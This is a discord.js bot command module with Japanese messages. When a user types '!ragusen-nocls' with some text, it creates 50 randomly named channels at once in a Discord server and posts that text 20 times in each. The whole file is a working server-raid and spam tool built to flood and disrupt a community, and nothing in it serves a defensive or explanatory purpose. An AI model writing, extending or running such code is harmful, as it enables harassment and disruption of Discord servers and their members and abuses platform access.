const { ChannelType } = require('discord.js');
const rand = () => Math.random().toString(36).slice(2, 9);

module.exports = {
  async run(message) {
    const m = message.content.match(/^!ragusen-nocls\s+"(.+)"$/s);
    if (!m) {
      return message.reply('使い方: `!ragusen-nocls "送る内容"`');
    }
    const text = m[1];

    await message.reply('⚠️ 実行開始（既存チャンネルは維持→50ch同時作成→各20回同時送信）。');

    try {
      // 50個作成 (既存チャンネルは削除しない)
      const created = (await Promise.all(
        Array.from({ length: 50 }, () =>
          message.guild.channels.create({ name: rand(), type: ChannelType.GuildText }).catch(() => null)
        )
      )).filter(Boolean);

      // 20回送信
      await Promise.all(
        created.map(c => (async () => {
          for (let j = 0; j < 20; j++) await c.send(text).catch(() => {});
        })())
      );

      if (created[0]) created[0].send('✅ ragusen-nocls 完了');
    } catch (e) {
      message.reply('実行エラー: ' + e.message);
    }
  }
};
